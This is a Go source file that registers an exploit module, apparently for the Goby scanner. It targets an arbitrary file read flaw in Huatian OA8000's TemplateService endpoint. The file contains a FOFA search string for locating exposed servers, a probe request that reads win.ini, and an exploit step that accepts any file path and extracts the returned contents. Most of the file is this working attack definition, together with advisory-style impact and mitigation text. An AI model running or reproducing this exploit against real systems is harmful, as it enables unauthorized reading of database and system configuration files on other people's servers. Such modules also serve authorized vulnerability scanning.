package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Huatian-OA8000 /OAapp/bfapp/buffalo/TemplateService File Read Vulnerability",
    "Description": "<p>Huatian Power OA Office System is a professional office automation software designed to help enterprises improve work efficiency, reduce costs, and enhance internal communication and collaboration. The vulnerability allows attackers to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., leading to an extremely insecure state of the web site.</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com/",
    "DisclosureDate": "2024-04-09",
    "PostTime": "2024-04-10",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\"",
    "Level": "1",
    "Impact": "<p>The vulnerability allows attackers to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., leading to an extremely insecure state of the web site.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "c:/windows/win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/TemplateService",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "JSESSIONID=583ADDD3621F3F511BE8B379EA7FD407",
                    "Upgrade-Insecure-Requests": "1",
                    "Connection": "close",
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call> \n<method>getHtmlContent</method> \n<string>c:/windows/win.ini</string>\n</buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/OAapp/bfapp/buffalo/TemplateService",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/OAapp/bfapp/buffalo/TemplateService"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/TemplateService",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "JSESSIONID=583ADDD3621F3F511BE8B379EA7FD407",
                    "Upgrade-Insecure-Requests": "1",
                    "Connection": "close",
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call> \n<method>getHtmlContent</method> \n<string>{{{content}}}</string>\n</buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "string",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?:<string>)([\\s\\S]*)(?:</string>)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "华天动力OA办公系统 /OAapp/bfapp/buffalo/TemplateService 文件读取漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力OA办公系统是一款专业的办公自动化软件，旨在帮助企业提高工作效率、降低成本、加强内部沟通和协作。攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.oa8000.com/\" target=\"_blank\">http://www.oa8000.com/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Huatian-OA8000 /OAapp/bfapp/buffalo/TemplateService File Read Vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian Power OA Office System is a professional office automation software designed to help enterprises improve work efficiency, reduce costs, and enhance internal communication and collaboration. The vulnerability allows attackers to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., leading to an extremely insecure state of the web site.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"http://www.oa8000.com/\" target=\"_blank\">http://www.oa8000.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>The vulnerability allows attackers to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., leading to an extremely insecure state of the web site.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}